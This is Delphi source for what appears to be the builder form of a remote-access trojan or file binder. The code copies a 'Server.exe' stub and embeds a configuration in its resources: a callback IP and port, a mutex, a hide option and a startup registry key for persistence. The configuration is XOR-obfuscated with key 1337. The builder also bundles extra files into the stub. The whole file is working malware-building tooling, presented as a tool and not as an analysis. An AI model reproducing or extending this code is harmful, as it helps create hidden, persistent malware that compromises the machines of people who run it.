unit uBuild;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, ImgList, PngImageList, Buttons, PngBitBtn,
  Menus;

type
  TFrmBuild = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    GroupBox1: TGroupBox;
    Label1: TLabel;
    txtIP: TEdit;
    Label2: TLabel;
    txtPort: TEdit;
    Label3: TLabel;
    txtDelay: TEdit;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    ImageList: TPngImageList;
    GroupBox2: TGroupBox;
    GroupBox3: TGroupBox;
    btnBuild: TPngBitBtn;
    chkHide: TCheckBox;
    chkStartup: TCheckBox;
    GroupStartup: TGroupBox;
    Label5: TLabel;
    Label6: TLabel;
    txtInstallKey: TEdit;
    txtInstallValue: TEdit;
    GroupBox5: TGroupBox;
    Label4: TLabel;
    txtMutex: TEdit;
    Save: TSaveDialog;
    ListFiles: TListView;
    PopupFiles: TPopupMenu;
    Add1: TMenuItem;
    Delete1: TMenuItem;
    Open: TOpenDialog;
    procedure chkStartupClick(Sender: TObject);
    procedure btnBuildClick(Sender: TObject);
    procedure Add1Click(Sender: TObject);
    procedure Delete1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FrmBuild: TFrmBuild;

implementation

{$R *.dfm}

function ReadFile(FileName: String): AnsiString;
var
  F             :File;
  Buffer        :AnsiString;
  Size          :Integer;
  ReadBytes     :Integer;
  DefaultFileMode:Byte;
begin
  Result := '';
  DefaultFileMode := FileMode;
  FileMode := 0;
  AssignFile(F, FileName);
  Reset(F, 1);

  if (IOResult = 0) then
  begin
    Size := FileSize(F);
    while (Size > 1024) do
    begin
      SetLength(Buffer, 1024);
      BlockRead(F, Buffer[1], 1024, ReadBytes);
      Result := Result + Buffer;
      Dec(Size, ReadBytes);
    end;
    SetLength(Buffer, Size);
    BlockRead(F, Buffer[1], Size);
    Result := Result + Buffer;
    CloseFile(F);
  end;

  FileMode := DefaultFileMode;
end;

function MakeXor(Buffer :String; Key :Integer) :String;
var
  i,c,x  :Integer;
begin
  for i := 1 to Length(Buffer) do
  begin
    c := Integer(Buffer[i]);
    x := c xor Key;
    Result := Result + Char(x);
  end;
end;

procedure InsertRes(FilePath :String; TRes :LPTSTR; NameRes, Res :String);
var
  hRes   :THANDLE;
begin
  hRes := BeginUpdateResource(PChar(FilePath), False);
  UpdateResource(hRes, TRes, PChar(NameRes), LANG_SYSTEM_DEFAULT, @Res[1], Length(Res));
  EndUpdateResource(hRes, False);
end;

procedure TFrmBuild.chkStartupClick(Sender: TObject);
begin
  if not chkStartup.Checked then GroupStartup.Enabled := False;
end;

procedure TFrmBuild.btnBuildClick(Sender: TObject);
var
  Buffer :String;
  Path   :String;
  i      :Integer;
begin
  if Save.Execute then
  begin
    Path := Save.FileName+'.exe';
    CopyFile(PChar(ExtractFilePath(ParamStr(0))+'Server.exe'), PChar(Path), False);

    Buffer := txtIp.Text+'|'+txtPort.Text+'|'+txtDelay.Text+'|'+txtMutex.Text;
    if chkHide.Checked then Buffer := Buffer+'|1' else Buffer := Buffer+'|0';
    if chkStartup.Checked then Buffer := Buffer+'|1' else Buffer := Buffer+'|0';
    Buffer := Buffer+'|'+txtInstallKey.Text;
    Buffer := Buffer+'|'+txtInstallValue.Text;
    Buffer := MakeXor(Buffer, 1337);

    InsertRes(Path, RT_RCDATA, 'I', Buffer);
    Buffer := '';

    for i := 0 to (ListFiles.Items.Count-1) do
    begin
      Buffer := Buffer + ReadFile(ListFiles.Items.Item[i].SubItems.Strings[0]);
      Buffer := Buffer + '<<@@>>';
    end;

    InsertRes(Path, RT_RCDATA, 'N', IntToStr(ListFiles.Items.Count));
    InsertRes(Path, RT_RCDATA, 'B', Buffer);

    MessageBox(0, 'The new server is ready!', 'Information', 64);
  end;
end;

procedure TFrmBuild.Add1Click(Sender: TObject);
var
  NumberFiles :Integer;
begin
  if Open.Execute then
  begin
    if FileExists(Open.FileName) then
    begin
      NumberFiles := ListFiles.Items.Count;
      ListFiles.Items.Add;
      ListFiles.Items[NumberFiles].Caption := ExtractFileName(Open.FileName);
      ListFiles.Items[NumberFiles].SubItems.Add(Open.FileName);
    end;
  end;
end;

procedure TFrmBuild.Delete1Click(Sender: TObject);
begin
  ListFiles.DeleteSelected;
end;

end.
